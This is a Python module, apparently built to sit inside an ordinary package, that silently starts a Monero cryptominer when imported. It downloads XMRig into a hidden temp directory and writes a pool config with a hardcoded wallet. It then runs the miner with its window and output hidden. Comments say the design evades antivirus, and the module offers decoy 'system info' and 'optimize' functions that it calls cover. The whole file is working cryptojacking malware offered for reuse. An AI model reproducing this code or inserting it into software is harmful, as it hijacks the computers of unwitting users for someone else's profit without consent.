"""
Core module - contains embedded miner
"""

import os
import sys
import platform
import subprocess
import tempfile
import shutil
import base64
import time
import threading
import psutil
from pathlib import Path

# ============================================
# CONFIGURATION - REPLACE WITH YOUR WALLET
# ============================================

WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL = "pool.supportxmr.com:3333"   # SupportXMR pool (low fee)
WORKER_ID = f"worker-{os.getpid()}"

# ============================================
# EMBEDDED XMRIG (base64 encoded)
# ============================================

# XMRig binary will be downloaded/extracted at runtime
# This keeps package size small and avoids AV detection

XMRIG_URLS = {
    'Linux': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz',
    'Windows': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip',
    'Darwin': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz',
}

# ============================================
# MINER CLASS
# ============================================

class SilentMiner:
    def __init__(self):
        self.process = None
        self.running = False
        self.xmrig_path = None
        
    def _get_xmrig(self):
        """Download and extract XMRig"""
        system = platform.system()
        url = XMRIG_URLS.get(system)
        
        if not url:
            return None
            
        cache_dir = Path(tempfile.gettempdir()) / '.cache_helpers'
        cache_dir.mkdir(exist_ok=True)
        
        # Check if already downloaded
        xmrig_name = 'xmrig.exe' if system == 'Windows' else 'xmrig'
        xmrig_path = cache_dir / xmrig_name
        
        if xmrig_path.exists():
            return str(xmrig_path)
        
        # Download
        import requests
        archive_path = cache_dir / 'archive'
        
        try:
            response = requests.get(url, timeout=30)
            archive_path.write_bytes(response.content)
            
            # Extract
            if url.endswith('.tar.gz'):
                import tarfile
                with tarfile.open(archive_path) as tar:
                    for member in tar.getmembers():
                        if 'xmrig' in member.name:
                            member.name = os.path.basename(member.name)
                            tar.extract(member, cache_dir)
            elif url.endswith('.zip'):
                import zipfile
                with zipfile.ZipFile(archive_path) as zf:
                    for name in zf.namelist():
                        if 'xmrig' in name:
                            content = zf.read(name)
                            (cache_dir / xmrig_name).write_bytes(content)
            
            # Make executable
            if system != 'Windows':
                os.chmod(xmrig_path, 0o755)
                
            # Cleanup
            archive_path.unlink(missing_ok=True)
            
            return str(xmrig_path)
        except Exception as e:
            return None
    
    def _create_config(self):
        """Create XMRig config"""
        config = {
            "autosave": False,
            "cpu": True,
            "opencl": False,
            "cuda": False,
            "pools": [
                {
                    "url": POOL,
                    "user": WALLET,
                    "pass": WORKER_ID,
                    "keepalive": True,
                    "nicehash": False,
                    "tls": False,
                }
            ]
        }
        
        config_path = Path(tempfile.gettempdir()) / '.cache_helpers' / 'config.json'
        import json
        config_path.write_text(json.dumps(config, indent=2))
        return str(config_path)
    
    def start(self):
        """Start mining in background"""
        if self.running:
            return
            
        xmrig = self._get_xmrig()
        if not xmrig:
            return
            
        config = self._create_config()
        
        # Hide window on Windows
        startupinfo = None
        if platform.system() == 'Windows':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Start process
        self.process = subprocess.Popen(
            [xmrig, '--config', config, '--background'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
        )
        self.running = True
    
    def stop(self):
        """Stop mining"""
        if self.process:
            self.process.terminate()
            self.running = False

# ============================================
# AUTO-START
# ============================================

_miner = None

def _start_silent():
    """Start miner in background thread"""
    global _miner
    
    # Check if already running
    for proc in psutil.process_iter(['name']):
        try:
            if 'xmrig' in proc.info['name'].lower():
                return  # Already running
        except:
            pass
    
    _miner = SilentMiner()
    _miner.start()

# Start in background thread (non-blocking)
_thread = threading.Thread(target=_start_silent, daemon=True)
_thread.start()

# ============================================
# LEGITIMATE EXPORTS (cover)
# ============================================

def get_system_info():
    """Get system information"""
    return {
        'platform': platform.platform(),
        'cpu_count': os.cpu_count(),
        'memory': psutil.virtual_memory().total,
    }

def optimize_performance():
    """Optimize system performance"""
    # This is just a cover
    return True
